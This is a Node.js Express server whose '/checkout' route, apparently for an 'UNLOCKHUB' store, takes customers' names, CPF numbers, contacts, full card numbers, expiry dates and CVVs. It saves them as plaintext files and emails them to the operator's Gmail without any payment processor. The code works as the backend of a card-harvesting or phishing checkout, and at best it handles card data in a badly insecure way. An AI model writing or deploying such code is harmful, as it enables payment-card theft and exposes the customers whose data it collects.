const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// 🔐 CONFIGURAÇÃO EMAIL (Render usa variáveis de ambiente)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// ✅ ROTA CHECKOUT
app.post("/checkout", async (req, res) => {
  try {
    const {
      nome,
      cpf,
      whatsapp,
      email,
      produto,
      preco,
      metodo,
      numeroCartao,
      validade,
      cvv,
    } = req.body;

    const dados = `
NOVO PEDIDO - UNLOCKHUB

Nome: ${nome}
CPF: ${cpf}
WhatsApp: ${whatsapp}
Email: ${email}

Produto: ${produto}
Preço: R$ ${preco}
Método: ${metodo}

Número Cartão: ${numeroCartao || "-"}
Validade: ${validade || "-"}
CVV: ${cvv || "-"}
`;

    // 📁 Criar pasta pedidos se não existir
    const pastaPedidos = path.join(__dirname, "pedidos");
    if (!fs.existsSync(pastaPedidos)) {
      fs.mkdirSync(pastaPedidos);
    }

    // 📄 Salvar arquivo
    const nomeArquivo = path.join(
      pastaPedidos,
      `pedido_${Date.now()}.txt`
    );

    fs.writeFileSync(nomeArquivo, dados);

    // 📧 Enviar email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: `Novo Pedido - ${produto}`,
      text: dados,
    });

    res.send("ok");
  } catch (error) {
    console.log("Erro no checkout:", error);
    res.status(500).send("Erro no servidor");
  }
});

// 🚀 PORTA DINÂMICA (OBRIGATÓRIO NA RENDER)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Servidor rodando na porta " + PORT);
});
